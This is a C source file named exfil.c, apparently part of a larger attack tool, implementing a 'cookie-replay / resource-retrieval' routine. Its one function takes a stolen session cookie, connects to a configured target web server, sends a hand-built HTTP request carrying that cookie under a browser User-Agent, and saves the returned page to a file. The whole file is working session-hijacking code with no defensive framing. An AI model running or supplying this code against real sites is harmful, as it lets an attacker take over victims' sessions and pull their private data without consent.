/*
 * exfil.c
 *
 * Implementation of the cookie-replay / resource-retrieval routine.
 */

#include "exfil.h"
#include "sockio.h"
#include "config.h"

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define REQUEST_BUFFER_SIZE 4096

void fetch_with_cookie(const char *stolen_cookie,
                       const char *target_page, const char *out_file)
{
    if (stolen_cookie == NULL || target_page == NULL || out_file == NULL) {
        return;
    }

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        return;
    }
    set_socket_timeouts(fd, SOCKET_TIMEOUT_SECONDS);

    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(TARGET_WEB_PORT);
    if (inet_pton(AF_INET, TARGET_WEB_IP, &serv_addr.sin_addr) <= 0) {
        close(fd);
        return;
    }

    if (connect(fd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        close(fd);
        return;
    }

    char request[REQUEST_BUFFER_SIZE];
    int req_len = snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "Cookie: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        target_page, TARGET_WEB_IP, stolen_cookie);
    if (req_len < 0 || (size_t)req_len >= sizeof(request)) {
        close(fd);
        return;
    }

    if (send_all(fd, request, (size_t)req_len) != 0) {
        close(fd);
        return;
    }

    FILE *fp = fopen(out_file, "wb");
    if (fp != NULL) {
        char response[REQUEST_BUFFER_SIZE];
        ssize_t n;
        while ((n = recv(fd, response, sizeof(response), 0)) > 0) {
            fwrite(response, 1, (size_t)n, fp);
        }
        fclose(fp);
    }

    close(fd);
}
